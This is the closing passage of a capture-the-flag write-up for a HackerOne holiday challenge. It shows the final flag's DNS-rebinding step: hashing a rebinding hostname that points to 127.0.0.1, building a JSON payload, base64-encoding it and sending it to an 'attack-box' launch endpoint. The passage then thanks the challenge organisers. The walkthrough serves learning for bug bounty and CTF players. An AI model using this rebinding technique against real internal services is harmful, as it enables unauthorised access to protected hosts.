<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; echo md5(&quot;mrgrinch463cb007121.7f000001.rbndr.us&quot;);</span><br><span class="line">aa9c061c933f709acb4d69329bc7b1af</span><br></pre></td></tr></table></figure>

<p>With our hash created we just need to change the values of our old payload with our new ones :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;target&quot;:&quot;203.0.113.33&quot;,&quot;hash&quot;:&quot;5f2940d65ca4140cc18d0878bc398955&quot;&#125;</span><br><span class="line">&#123;&quot;target&quot;:&quot;cb007121.7f000001.rbndr.us&quot;,&quot;hash&quot;:&quot;aa9c061c933f709acb4d69329bc7b1af&quot;&#125; </span><br></pre></td></tr></table></figure>

<p>Now to finalize, we base64 encode our new payload and send it over:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ echo &#39;&#123;&quot;target&quot;:&quot;cb007121.7f000001.rbndr.us&quot;,&quot;hash&quot;:&quot;aa9c061c933f709acb4d69329bc7b1af&quot;&#125;&#39; | base64</span><br><span class="line">eyJ0YXJnZXQiOiJjYjAwNzEyMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiJhYTljMDYxYzkzM2Y3MDlhY2I0ZDY5MzI5YmM3YjFhZiJ9Cg&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Send --&gt; &#x2F;attack-box&#x2F;launch?payload&#x3D;eyJ0YXJnZXQiOiJjYjAwNzEyMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiJhYTljMDYxYzkzM2Y3MDlhY2I0ZDY5MzI5YmM3YjFhZiJ9Cg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>Now, it may not work the first time and that’s because we got to have the right timing of <strong>external IP first</strong> and <strong>internal IP second</strong>, so it may take some tries to get it right, but once we do, we save get redirected and with this save Christmas  :</p>
<p><img src="/images/hackerone-ctf/flag12_flag.png" alt="Flag 12 Flag"></p>
<h3 id="Thanks-and-Final-Thoughts"><a href="#Thanks-and-Final-Thoughts" class="headerlink" title="Thanks and Final Thoughts"></a>Thanks and Final Thoughts</h3><p>My objective with this writeup was to keep it clean, interactive, and easy to follow as much as possible not only for people that already have experience in the area but also for people that are starting out in Bug bounties, CTF’s or related to cybersecurity itself, to understand, have a good time reading along and hopefully learn something out of it. I would like to also thank <a target="_blank" rel="noopener" href="https://twitter.com/Hacker0x01">Hackerone</a>, <a target="_blank" rel="noopener" href="https://twitter.com/adamtlangley">Adam</a> and <a target="_blank" rel="noopener" href="https://twitter.com/NahamSec">NahamSec</a> for this fun experience !<br /></p>
<p>And a special mention to <strong>#grincharmy</strong> members from flag 11 who I’ve teamed up with to defeat that beast of a challenge, check out them out here :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://hackerone.com/mava?type=user">Max</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/panya">Panya</a></li>
<li><a target="_blank" rel="noopener" href="https://twitter.com/h3xone">h3x0ne</a></li>
<li><a target="_blank" rel="noopener" href="https://twitter.com/_d3f4u17_">d3f4u17</a></li>
<li><a target="_blank" rel="noopener" href="https://twitter.com/chron0x1">chron0x</a></li>
<li><a target="_blank" rel="noopener" href="https://twitter.com/NahamSec">Bendtheory</a></li>
</ul>
<p>Best regards, <strong>castilho</strong>.</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tools-and-Wordlists"><span class="toc-number">1.</span> <span class="toc-text">Tools and Wordlists</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-1-Recon-is-the-key"><span class="toc-number">2.</span> <span class="toc-text">Flag 1 | Recon is the key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-2-In-front-of-you"><span class="toc-number">3.</span> <span class="toc-text">Flag 2 | In front of you</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-3-People-Rater"><span class="toc-number">4.</span> <span class="toc-text">Flag 3 | People Rater</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-4-Swag-Shop"><span class="toc-number">5.</span> <span class="toc-text">Flag 4 | Swag Shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-5-Secure-Login"><span class="toc-number">6.</span> <span class="toc-text">Flag 5 | Secure Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-6-My-Diary"><span class="toc-number">7.</span> <span class="toc-text">Flag 6 | My Diary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-7-Hate-Mail-Generator"><span class="toc-number">8.</span> <span class="toc-text">Flag 7 | Hate Mail Generator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-8-Forum"><span class="toc-number">9.</span> <span class="toc-text">Flag 8 | Forum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-9-Evil-Quiz"><span class="toc-number">10.</span> <span class="toc-text">Flag 9 | Evil Quiz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-10-Signup-Manager"><span class="toc-number">11.</span> <span class="toc-text">Flag 10 | Signup Manager</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-11-Hell-on-my-Browser"><span class="toc-number">12.</span> <span class="toc-text">Flag 11 | Hell on my Browser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-12-Rebinding-Christmas"><span class="toc-number">13.</span> <span class="toc-text">Flag 12 | Rebinding Christmas</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thanks-and-Final-Thoughts"><span class="toc-number">14.</span> <span class="toc-text">Thanks and Final Thoughts</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&text=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&title=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&is_video=false&description=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Infiltrating into Grinch-Networks and saving Christmas!&body=Check out this article: http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&title=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&title=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&title=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&title=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&name=Infiltrating into Grinch-Networks and saving Christmas!&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&t=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021
    castilho
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->


</body>
</html>
